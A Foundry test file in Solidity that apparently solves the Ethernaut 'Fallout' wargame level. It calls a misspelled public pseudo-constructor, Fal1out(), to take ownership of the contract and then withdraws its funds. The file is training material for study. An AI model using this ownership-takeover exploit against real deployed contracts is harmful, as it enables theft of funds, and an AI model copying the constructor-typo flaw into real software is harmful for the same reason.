// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

// Fal1out() is typo
contract FalloutTest is Test {
    Fallout public instance;

    function setUp() public {
        instance = new Fallout();
    }

    function test() public {
        assertEq(instance.owner(), address(0));

        address alice = makeAddr("alice");
        vm.deal(alice, 1 ether);
        vm.startPrank(alice);
        instance.Fal1out();
        assertEq(instance.owner(), alice);

        instance.collectAllocations();
    }
}
